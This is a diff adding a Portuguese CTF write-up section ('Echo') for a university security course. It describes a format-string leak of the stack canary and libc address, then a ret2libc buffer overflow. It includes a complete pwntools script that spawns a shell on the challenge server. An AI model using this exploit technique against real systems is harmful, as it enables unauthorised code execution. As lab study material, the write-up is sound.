@@ -73,6 +73,145 @@ E assim já funcionou
 
 ![image-8.png](/images/ctf_fs/image-8.png)
 
+
+
+## Echo
+
+Como diz o enunciado usamos a versão do ubuntu 22.04, senão estes passos não funcionavam.
+
+Primeiro corremos o comando checksec, e verificamos que todas as proteções estavam ativas.
+
+![](/images/echo/1.png)
+
+
+Analizando o codigo no ghidra, verificamos que o programa tem um buffer overflow na linha 27, uma vez que lê 100 caracteres para um buffer que tem tamanho maximo 20. E na linha a seguir temos um format string, a funcao(FUN_000110e0 corresponde ao printf)
+
+![](/images/echo/2.png)
+
+
+O que vamos tentar fazer é apartir das funções do libc invocar uma shell, usando system('/bin/shell'). E depois alterar o return address para executar essa função.
+
+### Encontrar return adress
+
+Então para descobir onde está o return address, usamos o gdb, o que está no return address é 0xf7d9c519, que aponta para uma instrução de uma função do libc.
+
+![](/images/echo/3.png)
+
+Agora aproveitando o format string, descobrimos que eram necessário enviar isto %p%p%p%p%p%p%p%p%p%p%p, para encontrar esse endereço.
+
+![](/images/echo/4.png)
+
+Uma vez que são mais do que 20 letras, ele dá overwrite ao canário, pelo que aparece a mensagem.
+
+![](/images/echo/6png)
+
+
+### Encontrar canário
+
+Para então conseguirmos depois reescrever o return address vamos ter que encontrar o valor do canário antes.
+Com a ajuda do gdb descobrimos quantos %p é preciso enviar para encontrar o canário.
+Primeiro descobrimos o canário, valor que está no eax
+
+![](/images/echo/7.png)
+
+E depois enviamos %p até ele aparecer.
+
+![](/images/echo/8.png)
+
+
+### Encontrar endereço do system e de bin/sh
+
+Primeiro para descobrir o endereço do system executamos o seguinte comando. 
+
+![](/images/echo/9.png)
+
+Assim o endereço da função system vai ser Enderço Base do LIBC + 0x00048150.
+
+Para encontrar a string /bin/sh usada para passar como argumento do system executamos o seguinte comando:
+
+![](/images/echo/10.png)
+
+Esse número está em octadecimal, em decimal é 1822965.
+Assim o endereço vai ser Enderço Base do LIBC + 1822965.
+
+
+### Encontrar endereço base do libc
+Portanto agora temos que conseguir descobrir o endereço base do libc, e uma vez que as proteções estão todas ativas é um endereço aleatório.
+No gdb com o vmmap conseguimos descobrir o enderço base no debugger 0xf7d7b000:
+
+![](/images/echo/11.png)
+
+No debugger este endereço é fixo, mas a correr o programa normalmente não, então temos que encontrar uma forma de o descobrir em runtime.
+Uma vez que o return address que descobrimos anteriormente aponta para uma instrucao do libc, podemos encontrar o offset entre essa instrucao e o endereço base, e assim conseguir calcular em runtime.
+Offset = 0xf7d9c519 - 0xf7d7b000 = 0x21519.
+Assim descobirmos que ao subtrair ao return address 0x21519, encontramos o endereço base.
+
+
+
+### Criar o exploit
+Já temos todos os dados para criar o exploit.
+Enviamos 20 caracteres até chegar ao canario, damos overwrite ao canario, enviamos mais 8 caracteres para chegar ao ret address, enviamos o endereço do system. (Descobrimos estes valores usando o gdb). 
+E finalmente enviamos 4 bytes, uma vez que reparamos que o system aceitava como parametro os 4 bytes a seguir ao return address. E colocamos o endereço onde está o "/bin/sh".
+
+```py
+from pwn import *
+
+p = remote("ctf-fsi.fe.up.pt", 4002)
+
+# encontrar canario
+p.recvuntil(b">")
+p.sendline(b"e")
+p.recvuntil(b"Insert your name (max 20 chars):")
+p.sendline("%p%p%p%p%p%p%p%p")
+
+outp = p.recvuntil(b"Insert your message:")
+print( "OUT: '",outp,"'\n")
+canario = int(outp[64:64+10],16)
+print("\n Canario: " , hex(canario), "\n");
+p.sendline("mensagem")
+
+
+# encontrar ret address
+p.recvuntil(b">")
+p.sendline(b"e")
+
+print(p.recvuntil(b"Insert your name (max 20 chars):"))
+p.sendline("%p%p%p%p%p%p%p%p%p%p%p")
+
+outp = p.recvuntil(b"Insert your message:")
+p.sendline("mensagem")
+print( "OUT: '",outp,"'\n")
+ret_addr = outp[91:91+10]
+print("\n Ret address: " ,ret_addr, "\n");
+system = int(ret_addr,16) - 0x21519 + 0x0048150
+print("\n System: " ,hex(system), "\n");
+
+# encontrar /bin/sh
+sh = int(ret_addr,16) - 0x21519 + 1822965
+print("\n /bin/sh: " ,hex(sh), "\n");
+
+# enviar exploit
+p.recvuntil(b">")
+p.sendline(b"e")
+canario_bytes  =  (canario).to_bytes(4,byteorder='little') 
+system_bytes  =  (system).to_bytes(4,byteorder='little') 
+sh_byte = (sh).to_bytes(4,byteorder='little') 
+
+print(p.recvuntil(b"Insert your name (max 20 chars):"))
+
+p.sendline(b'A'*20 + canario_bytes + b'AAAAAAAA' + system_bytes + b"AAAA" + sh_byte)
+
+outp = p.recvuntil(b"Insert your message:")
+
+p.sendline("mensagem")
+
+print(p.recv())
+p.interactive()
+```
+
+
+
+
 ## Apply For Flag II
 
 Escrevemos um script na caixa de texto para verificar se era vulnerável a xss.
